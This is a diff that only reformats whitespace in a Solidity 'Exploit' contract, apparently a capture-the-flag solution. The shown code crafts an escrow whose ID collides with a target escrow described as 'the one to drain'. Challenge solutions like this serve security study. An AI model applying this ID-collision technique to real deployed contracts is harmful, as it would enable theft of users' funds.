@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.15;
 
-import { Setup, DualAssetEscrow } from "src/escrow/Setup.sol";
+import {Setup, DualAssetEscrow} from "src/escrow/Setup.sol";
 
 contract Exploit {
     Setup setup;
@@ -13,11 +13,11 @@ contract Exploit {
     function solve() external {
         // Deploy escrow that has the same ID as the one to drain
         bytes19 zero_bytes = bytes19(abi.encodePacked(address(0)));
-        (uint256 escrowId, ) = setup.factory().deployEscrow(
+        (uint256 escrowId,) = setup.factory().deployEscrow(
             0, // implId = 0
-            abi.encodePacked(address(setup.grey()), zero_bytes) // tokenY = 19 bytes of 0x00 
+            abi.encodePacked(address(setup.grey()), zero_bytes) // tokenY = 19 bytes of 0x00
         );
-        
+
         // ID of this escrow and the one to drain is the same
         assert(escrowId == setup.escrowId());
 
